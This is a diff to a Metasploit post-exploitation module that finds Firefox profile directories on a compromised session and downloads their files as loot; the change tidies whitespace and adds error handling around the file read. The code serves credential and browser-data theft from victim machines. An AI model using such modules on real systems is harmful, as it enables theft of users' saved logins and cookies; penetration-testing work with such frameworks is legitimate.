@@ -170,13 +170,13 @@ class Metasploit3 < Msf::Post
 		paths = []
 		path = path + "\\Mozilla\\"
 		print_status("Checking for Firefox directory in: #{path}")
-		
+
 		stat = session.fs.file.stat(path) rescue nil
 		if !stat
 			print_error("Firefox not found")
 			return
 		end
-		
+
 		session.fs.dir.foreach(path) do |fdir|
 			if fdir =~ /Firefox/i and @platform == :windows
 				paths << path + fdir + "Profiles\\"
@@ -227,11 +227,15 @@ class Metasploit3 < Msf::Post
 						print_good("Downloading #{file} file from: #{path}")
 						file = path + "\\" + file
 						fd = session.fs.file.new(file)
-						until fd.eof?
-							loot << fd.read
+						begin
+							until fd.eof?
+								loot << fd.read
+							end
+						rescue EOFError
+						ensure
+							fd.close
 						end
-						fd.close
-
+					
 						ext = file.split('.')[2]
 						if ext == "txt"
 							mime = "plain"
